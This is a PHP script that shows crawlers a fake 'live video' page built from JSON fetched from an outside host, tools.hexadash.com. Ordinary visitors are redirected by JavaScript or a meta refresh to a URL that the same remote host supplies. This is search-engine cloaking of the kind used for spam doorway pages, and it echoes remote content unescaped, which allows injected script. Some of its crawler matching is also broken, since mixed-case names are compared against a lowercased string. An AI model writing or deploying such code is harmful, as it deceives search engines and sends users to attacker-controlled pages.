<?php
function smart_ip_detect_crawler($user_agent)
{
    // User lowercase string for comparison.
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

    // A list of some common words used only for bots and crawlers.
    $bot_identifiers = array(
        'bot',
        'slurp',
        'crawler',
        'spider',
        'curl',
        'facebook',
        'fetch',
		'APIs-Google',
		'AdsBot Mobile Web Android',
		'AdsBot Mobile Web',
		'AdsBot',
		'Googlebot Image',
		'Googlebot News',
		'Googlebot Video',
		'Googlebot Desktop',
		'Googlebot Smartphone',
		'Mobile AdSense',
		'Feedfetcher',
		'Google Read Aloud',
		'Duplex on the web',
		'Google Favicon',
		'Web Light',
		'Google StoreBot',
		'Google Site Verifier',
    );

    // See if one of the identifiers is in the UA string.
    foreach ($bot_identifiers as $identifier)
    {
        if (strpos($user_agent, $identifier) !== false)
        {
            return true;
        }
    }

    return false;
};
$user_agent = '';
$live_video = trim($_GET["live_video"]);
  if(!empty($live_video)){
// Read the JSON file 
$url = 'https://tools.hexadash.com/data.php?live_video='.$live_video;
  $ch = curl_init($url);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$json = curl_exec($ch);
if(curl_error($ch)) { 
echo 'error:' . curl_error($ch);
};
curl_close($ch);
// Decode the JSON file
$json_data = json_decode($json,true);
  

if (smart_ip_detect_crawler($user_agent) == true){?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title><?php echo $json_data["post_title"]; ?></title>
	<meta name="description" content="<?php echo $json_data["post_description"]; ?>"/>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script type="application/ld+json">
    {
      "@context":"https://schema.org",
      "@type":"VideoObject",
      "name": "<?php echo $json_data["post_title"]; ?>",
      "description": "<?php echo $json_data["post_description"]; ?>",
      "uploadDate": "<?php echo $json_data["video_uploadDate"]; ?>",
      "thumbnailUrl": "<?php echo $json_data["video_thumbnailUrl"]; ?>",
      "contentUrl": "<?php echo $json_data["video_contentUrl"]; ?>",
      "duration":"<?php echo $json_data["video_duration"]; ?>",
      "publication": {
        "@type": "BroadcastEvent",
    	"isLiveBroadcast": true,
    	"name": "<?php echo $json_data["video_name"]; ?>",
        "startDate": "<?php echo $json_data["video_startDate"]; ?>",
        "endDate": "<?php echo $json_data["video_endDate"]; ?>"
      }
    }
    </script>
</head>
<body>
	<div class="wrapper">
		<div class="container-fluid">
			<div class="row">
				<div class="col-md-12">
						<div class="form-group">
							<p><?php echo $json_data["post_content"]; ?></p>
							
						</div>
					</div>
				</div>        
		</div>
	</div>
</body>
</html>

<?php } elseif(smart_ip_detect_crawler($user_agent) == false){?>
<script type="text/javascript">document.location.replace("<?php echo $json_data["post_document_replace"]; ?>");</script>
<noscript><meta http-equiv="refresh" content="0; url='<?php echo $json_data["post_no_script"]; ?>'"></noscript>
<?php }


 }